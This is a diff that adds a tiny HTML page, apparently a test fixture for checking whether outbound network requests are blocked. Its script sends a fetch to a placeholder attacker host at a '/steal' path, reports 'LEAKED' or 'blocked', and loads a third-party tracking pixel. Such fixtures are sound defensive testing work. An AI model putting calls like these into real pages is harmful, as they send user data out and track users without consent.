@@ -1,0 +1,6 @@
+<!DOCTYPE html><html><body><p id="out">pending</p>
+<script>
+fetch('https://evil.example.com/steal?x=1').then(function(){document.getElementById('out').textContent='LEAKED'})
+  .catch(function(){document.getElementById('out').textContent='blocked'});
+var i=new Image(); i.src='http://tracker.example.net/pixel.gif';
+</script></body></html>
